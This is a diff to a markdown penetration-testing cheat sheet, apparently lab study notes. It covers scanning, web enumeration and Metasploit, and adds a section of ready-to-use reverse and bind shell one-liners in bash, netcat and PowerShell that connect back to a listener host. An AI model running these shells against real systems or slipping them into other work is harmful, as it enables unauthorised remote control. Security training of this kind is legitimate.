@@ -5,6 +5,8 @@
 > - **Connect to FTP **  ftp 10.0.0.0   
 > - **Connect to SSH **  ssh user@10.0.0.0   
 
+
+    
 ## Service Scanning 
 > - **Run an nmap script scan on an IP **  nmap -sV -sC -p- 10.0.0.0   
 > - **Grab banner of an open port **  netcat 10.10.10.10 22   
@@ -13,14 +15,18 @@
 > - **Grab banner of an open port **  netcat 10.10.10.10 22
 > - **Grab banner of an open port **  netcat 10.10.10.10 22
 
+
+   
   
 ## WEB Enumb
 > - **scan web directories** gobuster dir -u http://10.10.10.121/ -w /usr/share/dirb/wordlists/common.txt
 > - **scan sub directories of a website** gobuster dns -d inlanefreight.com -w /usr/share/SecLists/Discovery/DNS/namelist.txt
 > - **List potential directories** curl 10.10.10.121/robots.txt
 > - **grab website banner** curl -IL https://www.inlanefreight.com
-> - **List details about webserver/certs** whatweb 10.10.10.121
+> - **List details about webserver/certs** whatweb 10.10.10.121 or whatweb --no-errors 10.10.10.0/24
 
+
+    
 
 ## Exploit Scan
 > - **Install exploitdb tool** sudo apt install exploitdb -y
@@ -34,9 +40,19 @@ Metasploit Framework (MSF) contains exploits for many public vulnerabilities and
 > - **Set a value for an MSF module option** set RHOSTS 10.10.10.40
 > - **Test if the target server is vulnerable** check
 > - **Run the exploit on the target server is vulnerable** exploit
+     
+    
 
-
-
+## Using SHells
+netcat can be used to connect to any listening port and interact with the service running on that port.
+> - **Start a nc listener on a local port (on my computer)** nc -lvnp 1234  or   nc 10.10.10.1 1234
+> - **Send a reverse shell from the remote server** bash -c 'bash -i >& /dev/tcp/10.10.10.10/1234 0>&1'
+> - **Another reverse shell from the remote server** rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.10.10 1234 >/tmp/f
+> - **Start a bind shell on the remote server** rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/bash -i 2>&1|nc -lvp 1234 >/tmp/f
+> - **same as above but with powershell** powershell -NoP -NonI -W Hidden -Exec Bypass -Command New-Object System.Net.Sockets.TCPClient("10.10.10.10",1234);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2  = $sendback + "PS " + (pwd).Path + "> ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()
+> - **Connect to a bind shell started on the remote server (on my computer)** nc 10.10.10.1 1234
+>
+> - **Upgrade shell TTY (1)
 
 > - 
   > whatweb --no-errors 10.10.10.0/24
@@ -70,14 +86,7 @@ Metasploit Framework (MSF) contains exploits for many public vulnerabilities and
 > nmap --script <script name> -p<port> <host>
   
 
-  
 
-  
-
-## Reverse Shell
-  # on my computer
-  > nc -lvnp 1234
-  > nc 10.10.10.1 1234
   # on host
   > bash -c 'bash -i >& /dev/tcp/10.10.10.10/1234 0>&1'
   > rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.10.10 1234 >/tmp/f
